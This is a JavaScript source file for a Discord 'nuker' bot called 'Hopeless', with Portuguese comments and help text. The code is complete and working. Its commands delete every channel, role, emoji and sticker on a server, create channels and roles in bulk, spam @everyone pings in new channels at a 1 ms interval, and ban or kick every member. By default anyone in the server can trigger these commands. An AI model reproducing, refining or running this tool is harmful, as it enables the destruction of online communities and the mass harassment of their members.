/**
 * Hopeless
 * @author Loponte
 */
const { Client, Intents, MessageEmbed } = require("discord.js");
const nuker = new Client({ intents: Object.values(Intents.FLAGS).reduce((a, b) => a + b) });
const { red, greenBright, cyan, yellow } = require("chalk");
const { token, prefix, userID, disableEveryone } = require("../config/config.json")

nuker.on("ready", () => {
    console.clear();
    console.log(red(`                                                   
                            Hopeless
                    Usuário: ${nuker.user.tag}
                    Prefixo: ${prefix}
    `))
    nuker.user.setActivity({ name: "Hopeless", type: "PLAYING" });
});

nuker.on("messageCreate", (message) => {

    // Comando de help
    const help = new MessageEmbed()
        .setDescription(`**Hopeless Beta ;**
    \n**criar canais em massa ;**
    ${prefix}mc [quantidade] (texto) i.e \`${prefix}mc 5 test\`\n
    **criar canais em massa com ping ;**
    ${prefix}cp [quantidade] (texto), {mensagem} \`${prefix}cp 5 teste, testando\`\n
    **criar cargos em massa ;**
    ${prefix}mr [quantidade] (texto) \`${prefix}mr 5 test\`\n
    **deletar todos os chats ;**
    ${prefix}dc\n
    **deletar todos os cargos ;**
    ${prefix}dr\n
    **deletar todos os emojis ;**
    ${prefix}de\n
    **deletar todos os stickers ;**
    ${prefix}ds\n
    **expulsão em massa ;**
    ${prefix}mk\n
    **banimento em massa ;**
    ${prefix}mb
    `)
        .setFooter(`© Hopeless Beta`)
        .setColor(0x36393E)
        .setTimestamp(Date.now());

    // Permissões
    const channelPerms = message.guild.me.permissions.has("MANAGE_CHANNELS" || "ADMINISTRATOR");
    const banPerms = message.guild.me.permissions.has("BAN_MEMBERS" || "ADMINISTRATOR");
    const kickPerms = message.guild.me.permissions.has("KICK_MEMBERS" || "ADMINISTRATOR");
    const rolePerms = message.guild.me.permissions.has("MANAGE_ROLES" || "ADMINISTRATOR");
    const emotePerms = message.guild.me.permissions.has("MANAGE_EMOJIS_AND_STICKERS" || "ADMINISTRATOR");

    // Possiveis 'args'
    let args = message.content.split(" ").slice(1);
    var args1 = args[0]; // Used for amount
    var args2 = args.slice(1).join(' ') // Naming things
    var args3 = args.slice(2).join(', '); // Other

    if (!disableEveryone) {
        // comandos

        // Help
        if (message.content.startsWith(prefix + "help")) {
            message.channel.send({embeds: [help]})
        }

        // Canais em massa
        if (message.content.startsWith(prefix + "mc")) {
            MassChannels(args1, args2).catch((err) => {
                message.reply(err);
            });
        }

        // Deletar todos os canais
        if (message.content.startsWith(prefix + "dc")) {
            DelAllChannels().catch((err) => {
                message.reply(err);
            });
        }

        // Criar canais em massa com ping
        if (message.content.startsWith(prefix + "cp")) {
            MassChnPing(args1, args2, args3).catch((err) => {
                message.reply(err);
            });
        }

        // Criar cargos
        if (message.content.startsWith(prefix + "mr")) {
            MassRoles(args1, args2).catch((err) => {
                message.reply(err);
            });
        }

        // Deletar todos os cargos
        if (message.content.startsWith(prefix + "dr")) {
            DelAllRoles().catch((err) => {
                message.reply(err);
            });
        }

        // Deletar todos os stickers
        if (message.content.startsWith(prefix + "ds")) {
            DelAllStickers().catch((err) => {
                message.reply(err);
            });
        }

        // Deletar todos os emojis
        if (message.content.startsWith(prefix + "de")) {
            DelAllEmotes().catch((err) => {
                message.reply(err);
            });
        }

        // Banimento em massa
        if (message.content.startsWith(prefix + "mb")) {
            BanAll().catch((err) => {
                message.reply(err);
            });
        }

        // Expulsão em massa
        if (message.content.startsWith(prefix + "mk")) {
            KickAll().catch((err) => {
                message.reply(err);
            });
        }
    } else {
        // Comandos

        // Help
        if (message.content.startsWith(prefix + "help")) {
            if (message.author.id != userID) return message.reply("Você não está autorizado a usar nenhum dos comandos desta ferramenta.");
            message.channel.send({embeds: [help]})
        }

        // Canais em massa
        if (message.content.startsWith(prefix + "mc")) {
            if (message.author.id != userID) return message.reply("Você não está autorizado a usar nenhum dos comandos desta ferramenta.");
            MassChannels(args1, args2).catch((err) => {
                message.reply(err);
            });
        }

        // Deletar todos os canais
        if (message.content.startsWith(prefix + "dc")) {
            if (message.author.id != userID) return message.reply("Você não está autorizado a usar nenhum dos comandos desta ferramenta.");
            DelAllChannels().catch((err) => {
                message.reply(err);
            });
        }

        // Criar canais em massa com ping
        if (message.content.startsWith(prefix + "cp")) {
            if (message.author.id != userID) return message.reply("Você não está autorizado a usar nenhum dos comandos desta ferramenta.");
            MassChnPing(args1, args2, args3).catch((err) => {
                message.reply(err);
            });
        }

        // Cargos em massa
        if (message.content.startsWith(prefix + "mr")) {
            if (message.author.id != userID) return message.reply("Você não está autorizado a usar nenhum dos comandos desta ferramenta.");
            MassRoles(args1, args2).catch((err) => {
                message.reply(err);
            });
        }

        // Deletar todos os cargos
        if (message.content.startsWith(prefix + "dr")) {
            if (message.author.id != userID) return message.reply("Você não está autorizado a usar nenhum dos comandos desta ferramenta.");
            DelAllRoles().catch((err) => {
                message.reply(err);
            });
        }

        // Deletar todos os Stickers
        if (message.content.startsWith(prefix + "ds")) {
            if (message.author.id != userID) return message.reply("Você não está autorizado a usar nenhum dos comandos desta ferramenta.");
            DelAllStickers().catch((err) => {
                message.reply(err);
            });
        }

        // Deletar todos os Emotes
        if (message.content.startsWith(prefix + "de")) {
            if (message.author.id != userID) return message.reply("Você não está autorizado a usar nenhum dos comandos desta ferramenta.");
            DelAllEmotes().catch((err) => {
                message.reply(err);
            });
        }

        // Banimento em massa
        if (message.content.startsWith(prefix + "mb")) {
            if (message.author.id != userID) return message.reply("Você não está autorizado a usar nenhum dos comandos desta ferramenta.");
            BanAll().catch((err) => {
                message.reply(err);
            });
        }

        // Expulsão em massa
        if (message.content.startsWith(prefix + "mk")) {
            if (message.author.id != userID) return message.reply("Você não está autorizado a usar nenhum dos comandos desta ferramenta.");
            KickAll().catch((err) => {
                message.reply(err);
            });
        }
    }

    // Funções do Nuke

    /**
     * Criação dos canais em massa
     * @param {number} amount Quantidade
     * @param {string} channelName Nome dos canais
     */
    function MassChannels(amount, channelName) {
        return new Promise((resolve, reject) => {
            if (!amount) return reject("Args não especificadas: especifique a quantidade que você deseja para os canais em massa");
            if (isNaN(amount)) return reject("Erro de escrita: Use um numero para especificar");
            if (amount > 500) return reject("Erro de quantidade: o tamanho máximo do canal da guild é de 500 | Dica: use um número inferior a 500");
            if (!channelPerms) return reject("Permissões de bot ausentes: 'MANAGE_CHANNELS'");
            for (let i = 0; i < amount; i++) {
                if (message.guild.channels.cache.size === 500) break;
                if (!channelName) {
                    message.guild.channels.create(`${message.author.username} estava aqui`, { type: "GUILD_TEXT" }).catch((err) => { console.log(red("Erro encontrado: " + err)) })
                } else {
                    message.guild.channels.create(channelName, { type: "GUILD_TEXT" }).catch((err) => { console.log(red("Erro encontrado: " + err)) })
                }
            }
            resolve();
        });
    }

    /**
     * Criação dos canais em massa com ping
     * @param {number} amount Quantidade
     * @param {string} channelName Nome dos canais
     * @param {string} pingMessage Os canais terão o everyone marcado
     */
    function MassChnPing(amount, channelName, pingMessage) {
        return new Promise((resolve, reject) => {
            if (!amount) return reject("Args não especificadas: especifique a quantidade que você deseja para os canais em massa");
            if (isNaN(amount)) return reject("Erro de escrita: Use um numero para especificar");
            if (amount > 500) return reject("Erro de quantidade: o tamanho máximo do canal da guild é 500 | Dica: use um número inferior a 500");
            if (!channelPerms) return reject("Permissões de bot ausentes: 'MANAGE_CHANNELS'");
            if (!pingMessage) return reject("Args não especificadas: especifique a mensagem que deseja mencionar em massa");
            for (let i = 0; i < amount; i++) {
                if (message.guild.channels.cache.size === 500) break;
                if (!channelName) {
                    message.guild.channels.create(`${message.author.username} was here`, { type: "GUILD_TEXT" }).catch((err) => { console.log(red("Erro encontrado: " + err)) }).then((ch) => {
                        setInterval(() => {
                            ch.send("@everyone " + pingMessage);
                        }, 1);
                    });
                } else {
                    message.guild.channels.create(channelName, { type: "GUILD_TEXT" }).catch((err) => { console.log(red("Erro encontrado: " + err)) }).then((ch) => {
                        setInterval(() => {
                            ch.send("@everyone " + pingMessage);
                        }, 1); // literalmente não é possível, mas hmmm?
                    });
                }
            }
            resolve();
        });
    }

    /**
     * Deletando todos os canais do server
     */
    function DelAllChannels() {
        return new Promise((resolve, reject) => {
            if (!channelPerms) return reject("Permissões de bot ausentes: 'MANAGE_CHANNELS'");
            message.guild.channels.cache.forEach((ch) => ch.delete().catch((err) => { console.log(red("Erro encontrado: " + err)) }))
            resolve();
        });
    }

    /**
     * Criando cargos em massa
     * @param {number} amount Quantidade
     * @param {string} roleName Nome do cargo
     */
    function MassRoles(amount, roleName) {
        return new Promise((resolve, reject) => {
            if (!amount) return reject("Args não especificadas: especifique a quantidade que deseja criar as roles");
            if (isNaN(amount)) return reject("Erro de escrita: Use um numero para especificar");
            if (!rolePerms) return reject("Permissões de bot ausentes: 'MANAGE_ROLES'");
            for (let i = 0; i <= amount; i++) {
                if (message.guild.roles.cache.size === 250) break;
                if (!roleName) {
                    message.guild.roles.create({ name: "nuked", color: "RANDOM", position: i++ }).catch((err) => { console.log(red("Erro encontrado: " + err)) })
                } else {
                    message.guild.roles.create({ name: roleName, color: "RANDOM", position: i++ }).catch((err) => { console.log(red("Erro encontrado: " + err)) })
                }
            }
        })
    }

    /**
     * Deletando todos os cargos
     */
    function DelAllRoles() {
        return new Promise((resolve, reject) => {
            if (!rolePerms) return reject("Permissões de bot ausentes: 'MANAGE_ROLES'");
            message.guild.roles.cache.forEach((r) => r.delete().catch((err) => { console.log(red("Erro encontrado: " + err)) }))
        });
    }

    /**
     * Deletando todos os emotes
     */
    function DelAllEmotes() {
        return new Promise((resolve, reject) => {
            if (!emotePerms) return reject("Permissões de bot ausentes: 'MANAGE_EMOJIS_AND_STICKERS'");
            message.guild.emojis.cache.forEach((e) => e.delete().catch((err) => { console.log(red("Erro encontrado: " + err)) }))
        });
    }

    /**
     * Deletando todos os stickers
     */
    function DelAllStickers() {
        return new Promise((resolve, reject) => {
            if (!emotePerms) return reject("Permissões de bot ausentes: 'MANAGE_EMOJIS_AND_STICKERS'");
            message.guild.stickers.cache.forEach((s) => s.delete().catch((err) => { console.log(red("Erro encontrado: " + err)) }))
        });
    }

    /**
     * Ban em massa
     */
    function BanAll() {
        return new Promise((resolve, reject) => {
            if (!banPerms) return reject("Permissões de bot ausentes: 'BAN_MEMBERS'");
            let arrayOfIDs = message.guild.members.cache.map((user) => user.id);
            message.reply("Found " + arrayOfIDs.length + " users.").then((msg) => {
                setTimeout(() => {
                    msg.edit("Banindo...");
                    for (let i = 0; i < arrayOfIDs.length; i++) {
                        const user = arrayOfIDs[i];
                        const member = message.guild.members.cache.get(user);
                        member.ban().catch((err) => { console.log(red("Erro encontrado: " + err)) }).then(() => { console.log(greenBright(`${member.user.tag} foi banido.`)) });
                    }
                }, 2000);
            })
        })
    }

    /**
     * Expulsão em massa
     */
    function KickAll() {
        return new Promise((resolve, reject) => {
            if (!kickPerms) return reject("Permissões de bot ausentes: 'KICK_MEMBERS'");
            let arrayOfIDs = message.guild.members.cache.map((user) => user.id);
            message.reply("Found " + arrayOfIDs.length + " users.").then((msg) => {
                setTimeout(() => {
                    msg.edit("Banning...");
                    for (let i = 0; i < arrayOfIDs.length; i++) {
                        const user = arrayOfIDs[i];
                        const member = message.guild.members.cache.get(user);
                        member.kick().catch((err) => { console.log(red("Erro encontrado: " + err)) }).then(() => { console.log(greenBright(`${member.user.tag} foi expulso.`)) });
                    }
                }, 2000);
            })
        })
    }
});

try {
    nuker.login(token);
} catch (err) {
    console.error(err)
}
